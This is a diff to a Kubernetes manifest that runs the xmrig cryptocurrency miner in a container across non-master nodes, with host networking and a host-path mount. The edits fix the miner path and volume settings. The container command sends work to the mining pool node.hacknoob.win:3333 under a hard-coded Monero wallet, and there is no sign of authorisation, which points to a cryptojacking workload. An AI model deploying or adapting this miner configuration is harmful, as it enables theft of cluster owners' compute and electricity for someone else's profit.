@@ -21,7 +21,7 @@ spec:
             nodeSelectorTerms:
               - matchExpressions:
                   - key: kubernetes.io/hostname
-                    operator: NotIn  # Use NotIn without spaces for the operator
+                    operator: NotIn
                     values:
                       - master
       hostNetwork: true  # Add this line to use the host's network
@@ -29,7 +29,7 @@ spec:
       containers:
         - name: xmrig-container
           image: busybox
-          command: ["sh", "-c", "/root/xmrig/build/xmrig -t 1 -o node.hacknoob.win:3333 -u 46DWjxWviwCVHbYHaMxjusjGKm55LJmG6f3YTCJDmTf2RxCLfQRx22fSRELvwq36kY6iSGD5tiUsSQ4AsE8UFnWFBDd1Lzn"]
+          command: ["sh", "-c", "./xmrig -t 1 -o node.hacknoob.win:3333 -u 46DWjxWviwCVHbYHaMxjusjGKm55LJmG6f3YTCJDmTf2RxCLfQRx22fSRELvwq36kY6iSGD5tiUsSQ4AsE8UFnWFBDd1Lzn"]
           resources:
             limits:
               cpu: "2"
@@ -38,10 +38,10 @@ spec:
               cpu: "500m"
               memory: "500Mi"
           volumeMounts:
-            - name: xmrig-data  # Corrected volume name
-              mountPath: /root/xmrig
+            - name: xmrig-data
+              mountPath: /xmrig  # Mount host's directory containing xmrig
       volumes:
         - name: xmrig-data
           hostPath:
-            path: /xmrig
+            path: ./xmrig/build  # Path to xmrig on the host 
             type: DirectoryOrCreate
